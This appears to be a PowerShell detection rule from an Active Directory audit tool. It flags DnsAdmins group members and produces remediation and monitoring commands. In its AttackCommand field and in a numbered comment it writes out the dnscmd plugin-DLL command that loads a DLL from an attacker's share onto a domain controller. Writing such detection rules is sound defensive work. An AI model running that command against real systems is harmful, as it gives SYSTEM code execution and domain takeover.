@{
    Id          = 'P-DnsAdminsAbuse'
    Version     = '1.0.0'
    Category    = 'PrivilegedAccess'
    Title       = 'DnsAdmins Group Membership - Code Execution Risk'
    Description = 'Detects non-essential members in the DnsAdmins group. Members can configure DNS to load arbitrary DLLs on Domain Controllers, enabling code execution as SYSTEM and complete domain compromise.'
    Severity    = 'Critical'
    Weight      = 45
    DataSource  = 'Groups'

    References  = @(
        @{ Title = 'DnsAdmins Privilege Escalation'; Url = 'https://adsecurity.org/?p=4064' }
        @{ Title = 'DNS Server DLL Attack'; Url = 'https://medium.com/@esnesenern/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83' }
    )

    MITRE = @{
        Tactics    = @('TA0004', 'TA0002')  # Privilege Escalation, Execution
        Techniques = @('T1574.002')          # DLL Side-Loading
    }

    CIS   = @('5.4.7')
    STIG  = @('V-220957')
    ANSSI = @('R56')

    Scoring = @{
        Type      = 'PerDiscovery'
        PerItem   = 30
    }

    Detect = {
        param($Data, $Domain)

        $findings = @()

        try {
            $dnsAdmins = Get-ADGroup -Identity "DnsAdmins" -Properties Members -ErrorAction SilentlyContinue

            if ($dnsAdmins) {
                $members = Get-ADGroupMember -Identity $dnsAdmins -Recursive -ErrorAction SilentlyContinue

                if ($members -and $members.Count -gt 0) {
                    foreach ($member in $members) {
                        # Get more details about the member
                        $memberDetails = $null
                        if ($member.objectClass -eq 'user') {
                            $memberDetails = Get-ADUser -Identity $member.SamAccountName -Properties Enabled, Description, WhenCreated -ErrorAction SilentlyContinue
                        }

                        $findings += [PSCustomObject]@{
                            GroupName           = 'DnsAdmins'
                            MemberName          = $member.SamAccountName
                            MemberType          = $member.objectClass
                            MemberDN            = $member.distinguishedName
                            Enabled             = if ($memberDetails) { $memberDetails.Enabled } else { 'N/A' }
                            Description         = if ($memberDetails) { $memberDetails.Description } else { 'N/A' }
                            RiskLevel           = 'Critical'
                            AttackCapability    = @(
                                'Can configure DNS server to load arbitrary DLL',
                                'DLL runs as SYSTEM on Domain Controller',
                                'Single command leads to DC compromise',
                                'No special tools required - built-in dnscmd'
                            ) -join '; '
                            AttackCommand       = 'dnscmd dc01 /config /serverlevelplugindll \\attacker\share\evil.dll'
                        }
                    }
                }
            }
        }
        catch {
            # Group may not exist or cannot be queried
        }

        return $findings
    }

    Remediation = @{
        Description = 'Remove all non-essential members from DnsAdmins group. DNS administration should be performed by Domain Admins or via delegated GPO.'
        Impact      = 'Medium - Members will lose ability to manage DNS'
        Script      = {
            param($Finding, $Domain)

            $commands = @"
# ================================================================
# DnsAdmins GROUP - CRITICAL PRIVILEGE ESCALATION PATH
# ================================================================
# DnsAdmins members can configure the DNS service to load a
# custom DLL. This DLL runs as SYSTEM on the DC.
#
# Attack is trivial:
# 1. Create malicious DLL
# 2. Host on SMB share
# 3. Run: dnscmd dc01 /config /serverlevelplugindll \\attacker\share\evil.dll
# 4. Restart DNS service (or wait for DC restart)
# 5. DLL executes as SYSTEM = Domain compromise

# ================================================================
# CURRENT MEMBERS
# ================================================================

Get-ADGroupMember -Identity "DnsAdmins" -Recursive | ``
    Select-Object Name, SamAccountName, objectClass, distinguishedName

"@
            foreach ($item in $Finding.Findings) {
                $commands += @"

# Member: $($item.MemberName) ($($item.MemberType))
# Enabled: $($item.Enabled)
# Description: $($item.Description)
# Risk: $($item.RiskLevel)

"@
            }

            $commands += @"

# ================================================================
# REMEDIATION: REMOVE ALL MEMBERS
# ================================================================

# DNS should be managed by Domain Admins, not a separate group
# Remove all members:

`$members = Get-ADGroupMember -Identity "DnsAdmins"
foreach (`$member in `$members) {
    Remove-ADGroupMember -Identity "DnsAdmins" -Members `$member -Confirm:`$false
    Write-Host "Removed `$(`$member.SamAccountName) from DnsAdmins"
}

# Verify empty:
Get-ADGroupMember -Identity "DnsAdmins"

# ================================================================
# IF DNS DELEGATION IS REQUIRED
# ================================================================

# If specific users MUST manage DNS without Domain Admin:
# 1. Create new group with MINIMAL permissions
# 2. Delegate only necessary DNS operations via GPO
# 3. Do NOT use DnsAdmins

# Better approach: Use Just-In-Time access via PIM/PAM

# ================================================================
# DETECTION: MONITOR FOR ABUSE
# ================================================================

# Event ID 770 - DNS Server plugin DLL loaded
# Monitor for: dnscmd.exe with /serverlevelplugindll

# Check current DNS configuration:
`$DCs = Get-ADDomainController -Filter *
foreach (`$dc in `$DCs) {
    try {
        `$dnsConfig = dnscmd `$dc.Name /info /serverlevelplugindll 2>&1
        if (`$dnsConfig -match 'ServerLevelPluginDll') {
            Write-Host "WARNING: ServerLevelPluginDll configured on `$(`$dc.Name): `$dnsConfig"
        }
    } catch { }
}

"@
            return $commands
        }
    }
}
